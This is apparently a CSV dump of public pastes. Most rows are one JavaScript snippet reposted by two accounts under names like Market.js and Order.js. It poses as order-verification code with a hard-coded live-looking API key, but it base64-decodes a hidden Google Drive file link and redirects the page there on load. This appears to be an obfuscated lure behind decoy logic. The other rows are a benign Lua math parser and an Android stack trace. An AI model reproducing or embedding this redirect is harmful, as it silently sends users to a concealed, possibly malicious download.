id,title,username,language,date,content
WZtMfALt,Untitled,Epiphemeral,JavaScript,Friday 11th of April 2025 09:02:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30017/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9MMbuy6M,Products.js,Epiphemeral,JavaScript,Friday 11th of April 2025 08:46:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36979/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
W2VqMHGc,Order.js,Epiphemeral,JavaScript,Friday 11th of April 2025 08:31:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11067/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ypire7ng,Market.js,Epiphemeral,JavaScript,Friday 11th of April 2025 08:15:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81562/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bbvbydDS,String-to-Math Calculator,1m1m0,Lua,Friday 11th of April 2025 08:11:33 PM CDT,"-- MathParserModule.lua

local MathParser = {}

--------------------------------------------------
-- Supported functions and constants.
--------------------------------------------------
local mathFunctions = {
	sin   = math.sin,
	cos   = math.cos,
	tan   = math.tan,
	asin  = math.asin,
	acos  = math.acos,
	atan  = math.atan,
	sinh  = math.sinh,
	cosh  = math.cosh,
	tanh  = math.tanh,
	ceil  = math.ceil,
	floor = math.floor,
	abs   = math.abs,
	deg   = math.deg,
	rad   = math.rad,
	exp   = math.exp,
	max   = math.max,
	min   = math.min,
	map   = math.map,
	fmod  = math.fmod,
	log   = math.log,
	-- Integer-based randomizer
	rand  = math.random, 
	round = math.round,
	-- Reciprocal trigonometric functions:
	csc	  = function(x) return 1 / math.sin(x) end,
	sec   = function(x) return 1 / math.cos(x) end,
	cot   = function(x) return 1 / math.tan(x) end,
	-- New root function:
	root = function(...)
		local args = { ... }
		if #args == 1 then
			return math.sqrt(args[1])
		elseif #args == 2 then
			local n, x = args[1], args[2]
			return x^(1/n)
		else
			error(""root expects 1 or 2 arguments"")
		end
	end,
	--[ Floating-point randomizer (alternative)
	rng = function(...)
		local args = { ... }
		if #args == 1 then
			return math.random() * args[1]
		elseif #args == 2 then
			local a, b = args[1], args[2]
			if a > b then a, b = b, a end
			return math.random() * (b - a) + a
		else
			error(""rand expects 1 or 2 arguments"")
		end
	end,
	--]]
}

local mathConstants = {
	pi  = math.pi,
	tau = math.pi * 2,
	deltaS = math.sqrt(2) + 1, -- The silver ratio
	phi = (1 + math.sqrt(5)) / 2, -- The golden ratio
	psi = 1.46557123187676802665, -- Supergolden ratio (decimalized because it's too complex)
	e   = math.exp(1), -- Euler's number
	inf = math.huge,
}

--------------------------------------------------
-- Step 1: Tokenizer
--------------------------------------------------
local function tokenize(expr)
	local tokens = {}
	local i = 1
	while i <= #expr do
		local c = expr:sub(i, i)
		if c:match(""%s"") then
			i = i + 1
		elseif c:match(""[%d%.]"") then
			local num = """"
			-- Capture the base number (integer or float)
			while i <= #expr and expr:sub(i, i):match(""[%d%.]"") do
				num = num .. expr:sub(i, i)
				i = i + 1
			end
			-- Check for scientific notation (without intervening spaces)
			if i <= #expr and (expr:sub(i, i) == ""e"" or expr:sub(i, i) == ""E"") then
				num = num .. expr:sub(i, i)
				i = i + 1
				-- Optional sign after e/E
				if i <= #expr and (expr:sub(i, i) == ""+"" or expr:sub(i, i) == ""-"") then
					num = num .. expr:sub(i, i)
					i = i + 1
				end
				-- Append the exponent digits
				while i <= #expr and expr:sub(i, i):match(""%d"") do
					num = num .. expr:sub(i, i)
					i = i + 1
				end
			end
			table.insert(tokens, {type = ""number"", value = tonumber(num)})
		elseif c == "","" then
			-- Recognize comma as an argument separator.
			table.insert(tokens, {type = ""comma"", value = c})
			i = i + 1
		elseif c:match(""[%a]"") then
			-- Process an identifier (could be a function or constant).
			local ident = """"
			while i <= #expr and expr:sub(i, i):match(""[%a_]"") do
				ident = ident .. expr:sub(i, i)
				i = i + 1
			end
			ident = ident:lower()
			if mathConstants[ident] then
				-- Insert the constant’s numeric value.
				table.insert(tokens, {type = ""constant"", value = mathConstants[ident]})
			elseif mathFunctions[ident] then
				-- Mark as a function token and initialize its argument count.
				table.insert(tokens, {type = ""function"", value = ident, argCount = 1})
			else
				-- Unknown identifier.
				table.insert(tokens, {type = ""unknown"", value = ident})
			end
		elseif c == ""("" or c == "")"" then
			table.insert(tokens, {type = ""paren"", value = c})
			i = i + 1
		else
			-- Check for multi-character operators like floor division ""//""
			local op = nil
			if i < #expr and expr:sub(i, i+1) == ""//"" then
				op = ""//""
				i = i + 2
			else
				-- If not a multi-character operator, treat it as a single-character operator.
				op = c
				i = i + 1
			end
			table.insert(tokens, {type = ""operator"", value = op})
		end
	end
	return tokens
end

--------------------------------------------------
-- Process tokens to detect and mark unary minus.
--------------------------------------------------
local function processUnaryOperators(tokens)
	for i = 1, #tokens do
		local token = tokens[i]
		if token.type == ""operator"" and token.value == ""-"" then
			-- Check if this '-' is a unary operator.
			-- It is considered unary if it is at the beginning or if the previous token is one that cannot be an operand.
			local prev = tokens[i-1]
			if (not prev) or (prev.type == ""operator"" or prev.type == ""comma"" or (prev.type == ""paren"" and prev.value == ""("")) then
				-- Convert to unary minus.
				token.type = ""unary""
				token.value = ""u-""
			end
		end
	end
	return tokens
end

--------------------------------------------------
-- Preprocess tokens to insert implicit multiplication.
--------------------------------------------------
local function insertImplicitMultiplication(tokens)
	local newTokens = {}
	for i = 1, #tokens do
		local token = tokens[i]
		table.insert(newTokens, token)
		-- Look ahead to the next token.
		if i < #tokens then
			local nextToken = tokens[i + 1]
			-- If the current token is a number, constant, or a closing parenthesis...
			if (token.type == ""number"" or token.type == ""constant"" or (token.type == ""paren"" and token.value == "")""))
				-- ...and the next token is an opening parenthesis,
				-- then insert an implicit multiplication operator.
				and (nextToken.type == ""paren"" and nextToken.value == ""("") then
				table.insert(newTokens, {type = ""operator"", value = ""*""})
			end
		end
	end
	return newTokens
end

--------------------------------------------------
-- Operator precedence and associativity
--------------------------------------------------
local operators = {
	[""E""]   = {precedence = 5, associativity = ""right""}, -- Scientific notation operator
	[""^""]   = {precedence = 4, associativity = ""right""},
	[""u-""]  = {precedence = 3.5, associativity = ""right""}, -- Unary minus operator.
	[""*""]   = {precedence = 3, associativity = ""left""},
	[""/""]   = {precedence = 3, associativity = ""left""},
	[""//""]  = {precedence = 3, associativity = ""left""},  -- Floor division operator
	[""+""]   = {precedence = 2, associativity = ""left""},
	[""-""]   = {precedence = 2, associativity = ""left""},
}

--------------------------------------------------
-- Step 2: Parser using the shunting-yard algorithm
--------------------------------------------------
local function shuntingYard(tokens)
	local output = {}
	local opStack = {}

	for _, token in ipairs(tokens) do
		if token.type == ""number"" or token.type == ""constant"" then
			table.insert(output, token)
		elseif token.type == ""function"" then
			-- Function token already has argCount initialized.
			table.insert(opStack, token)
		elseif token.type == ""comma"" then
			-- Process function argument separator.
			local foundParen = false
			while #opStack > 0 do
				if opStack[#opStack].type == ""paren"" and opStack[#opStack].value == ""("" then
					foundParen = true
					-- Increment the argument count for the function token right before the ""("".
					if #opStack > 1 and opStack[#opStack - 1].type == ""function"" then
						opStack[#opStack - 1].argCount = opStack[#opStack - 1].argCount + 1
					else
						return nil, ""Misplaced comma or missing function token""
					end
					break
				else
					table.insert(output, table.remove(opStack))
				end
			end
			if not foundParen then
				return nil, ""Misplaced comma or mismatched parentheses""
			end
		elseif token.type == ""operator"" or token.type == ""unary"" then
			local opValue = token.value
			while #opStack > 0 do
				local top = opStack[#opStack]
				-- For function tokens, we treat them as having highest precedence.
				if top.type ~= ""operator"" and top.type ~= ""unary"" and top.type ~= ""function"" then break end
				local o2Precedence = (top.type == ""function"" and 100 or (operators[top.value] and operators[top.value].precedence or 0))
				local o1Precedence = operators[opValue] and operators[opValue].precedence or 0
				local o1Assoc = operators[opValue] and operators[opValue].associativity or ""left""
				if (o1Assoc == ""left"" and o1Precedence <= o2Precedence) or
					(o1Assoc == ""right"" and o1Precedence < o2Precedence) then
					table.insert(output, table.remove(opStack))
				else
					break
				end
			end
			table.insert(opStack, token)
		elseif token.type == ""paren"" then
			if token.value == ""("" then
				table.insert(opStack, token)
			else  -- token.value == "")""
				while #opStack > 0 and not (opStack[#opStack].type == ""paren"" and opStack[#opStack].value == ""("") do
					table.insert(output, table.remove(opStack))
				end
				if #opStack == 0 then
					return nil, ""Mismatched parentheses""
				end
				table.remove(opStack) -- Remove the ""("".
				-- If the token at the top is a function, pop it.
				if #opStack > 0 and opStack[#opStack].type == ""function"" then
					table.insert(output, table.remove(opStack))
				end
			end
		elseif token.type == ""unknown"" then
			return nil, ""Unknown identifier: "" .. token.value
		end
	end

	while #opStack > 0 do
		local top = table.remove(opStack)
		if top.value == ""("" or top.value == "")"" then
			return nil, ""Mismatched parentheses""
		end
		table.insert(output, top)
	end

	return output
end

--------------------------------------------------
-- Step 3: Evaluate Reverse Polish Notation (RPN)
--------------------------------------------------
local function evaluateRPN(rpn)
	local stack = {}
	for _, token in ipairs(rpn) do
		if token.type == ""number"" or token.type == ""constant"" then
			table.insert(stack, token.value)
		elseif token.type == ""operator"" then
			-- Ensure there are enough operands.
			if #stack < 2 then return nil, ""Invalid expression"" end
			local b = table.remove(stack)
			local a = table.remove(stack)
			local result = nil
			if token.value == ""+"" then
				result = a + b
			elseif token.value == ""-"" then
				result = a - b
			elseif token.value == ""*"" then
				result = a * b
			elseif token.value == ""/"" then
				result = a / b
			elseif token.value == ""//"" then
				-- Floor division: a // b
				result = math.floor(a / b)
			elseif token.value == ""^"" then
				result = a ^ b
			elseif token.value == ""E"" then
				-- Evaluate as: a * (10^b)
				result = a * (10 ^ b)
			else
				return nil, ""Unknown operator: "" .. token.value
			end
			table.insert(stack, result)
		elseif token.type == ""unary"" then
			-- Unary operators require one operand.
			if #stack < 1 then return nil, ""Missing operand for unary operator: "" .. token.value end
			local a = table.remove(stack)
			local result = nil
			if token.value == ""u-"" then
				result = -a
			else
				return nil, ""Unknown unary operator: "" .. token.value
			end
			table.insert(stack, result)
		elseif token.type == ""function"" then
			-- Determine the number of arguments (default is 1)
			local nArgs = token.argCount or 1
			if #stack < nArgs then
				return nil, ""Missing argument for function: "" .. token.value
			end
			-- Collect arguments (they come off in reverse order)
			local args = {}
			for i = 1, nArgs do
				table.insert(args, 1, table.remove(stack))
			end
			local func = mathFunctions[token.value]
			if not func then
				return nil, ""Unknown function: "" .. token.value
			end
			-- Call the function with the unpacked arguments.
			local result = func(table.unpack(args))
			table.insert(stack, result)
		end
	end
	if #stack ~= 1 then
		return nil, ""Invalid expression""
	end
	return stack[1]
end

--------------------------------------------------
-- The universal parser function that catches errors and returns a message
--------------------------------------------------
function MathParser.evaluateExpression(expr)
	local tokens = tokenize(expr)
	-- Process unary operators (to accept negatives)
	tokens = processUnaryOperators(tokens)
	-- Insert implicit multiplication operators for cases like (x)(y) -> (x)* (y)
	tokens = insertImplicitMultiplication(tokens)
	local rpn, err = shuntingYard(tokens)
	if not rpn then
		return ""Error: "" .. err
	end
	local result, err2 = evaluateRPN(rpn)
	if result == nil then
		return ""Error: "" .. err2
	end
	return result
end

return MathParser"
iL0TX8Y2,Untitled,Epiphemeral,JavaScript,Friday 11th of April 2025 08:00:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54442/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XN13Ejhs,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 07:46:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88522/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Y6NV6CNs,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 07:30:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51771/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nawJYmgK,2025-04-12T02:16:54.067705,powerampache,PHP,Friday 11th of April 2025 07:16:54 PM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Too many follow-up requests: 21"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

"
LrN3303u,Products.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 07:15:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69152/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Xb2Eb8S8,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 06:54:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68442/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X0SDAWRi,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 06:39:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88283/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gcAWEhYN,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 06:23:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72319/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
